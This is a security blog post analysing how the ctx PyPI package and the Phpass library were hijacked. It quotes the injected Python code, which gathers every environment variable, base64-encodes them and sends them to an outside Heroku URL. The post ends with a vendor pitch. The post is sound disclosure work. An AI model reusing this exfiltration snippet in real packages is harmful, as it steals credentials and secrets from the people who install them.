---
title: "How two Python and PHP dependencies, ctx and Phpass, became malware that stole secrets and credentials"
description: A security expert's analysis of the malicious code added to ctx and Phpass, Python and PHP dependencies, that turned them into malware by sending environment variables and credentials to a third party attacker.
slug: python-ctx-package-malware
date: 2022-05-24
keywords: [dependencies]
tags: []
authors: [chris, free, gabe]
---

<!--
  ~ Copyright by LunaSec (owned by Refinery Labs, Inc)
  ~
  ~ Licensed under the Creative Commons Attribution-ShareAlike 4.0 International
  ~ (the "License"); you may not use this file except in compliance with the
  ~ License. You may obtain a copy of the License at
  ~
  ~ https://creativecommons.org/licenses/by-sa/4.0/legalcode
  ~
  ~ See the License for the specific language governing permissions and
  ~ limitations under the License.
  ~
-->

## PyPi package, `ctx`, compromised

After 7 years, the pypi package `ctx` received a version update. A malicious version of ctx was published under `0.2.2` as and update to the previous `0.1.2`. In this post we'll be reviewing the malicious code that was introduced.

<!--truncate-->

## Malicious Code in `ctx` version `0.2.2`

The following code was added to the package:

```python
def __init__(self):
    self.sendRequest()

    # code that performs dict access
    # please DO NOT RUN THIS CODE !

     def sendRequest(self):
        string = ""
        for _, value in environ.items():
            string += value+" "

        message_bytes = string.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')

        response = requests.get("https://anti-theft-web.herokuapp.com/hacked/"+base64_message)
```

## `Phpass` contains identical malware

The library `Phpass` also received identical malicous code around the same time.

<a href="https://twitter.com/s0md3v/status/1529005758540808192" target="_blank" rel="noopener">
  <img src="https://www.lunasec.io/docs/img/ctx-Twitter-Screenshot.png" alt="Screenshot of ctx Twitter tweet" />
</a>


<a href="https://twitter.com/s0md3v/status/1529010306466615296" target="_blank" rel="noopener">
  <img src="https://www.lunasec.io/docs/img/Phpass-Twitter-Screenshot.png" alt="Screenshot of Phpass Twitter tweet" />
</a>

## External References

- [Archived version](https://archive.ph/xTUEN) of package versions.

- [Initial post](https://old.reddit.com/r/Python/comments/uumqmm/ctx_new_version_released_after_7_years_750k) observing the package had been updated.

- [Reddit post](https://old.reddit.com/r/Python/comments/uwhzkj/i_think_the_ctx_package_on_pypi_has_been_hacked/) with details about the malicious changes to ctx.

- [Sonatype blog post](https://blog.sonatype.com/pypi-package-ctx-compromised-are-you-at-risk) with details about timeline.

## For a limited time, claim an expert security review

Though perhaps unconventional, our team of Security Engineers has been working with startups to audit their dependencies and help them manage their security roadmap.

Why? It's simple: By working with us, we also learn about the common problems that companies face while shipping software. Helping you enables us to make our Open Source software better.

To get started, send us an email at [deps@lunasec.io](mailto:deps@lunasec.io) or [schedule a 15 minute call](https://cal.com/lunasec/15min) with one of our engineers.

### Who are we?

If you've heard of [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/) or [Spring4Shell](https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities), then you're familiar with our work already! We're the security experts that gave those vulnerabilities their name by providing clear, concise advice and [building tools to resolve them](https://github.com/lunasec-io/lunasec).

Since then, we've interviewed hundreds of companies to help us build [LunaTrace](https://github.com/marketplace/lunatrace-by-lunasec).

What is LunaTrace? It's our Open Source security platform that automatically discovers vulnerabilities in your dependencies and gives you expert security guides with remediation steps and automated patches.

Whether you're a developer or a security professional, we'd love to hear from you! Drop us a line by [joining our Slack](https://join.slack.com/t/lunaseccommunity/shared_invite/zt-19wb6qg8w-OC1ktWO2LkG8lL3fpLD3AA) or trying out LunaTrace on your [GitHub repo for free](https://github.com/marketplace/lunatrace-by-lunasec).
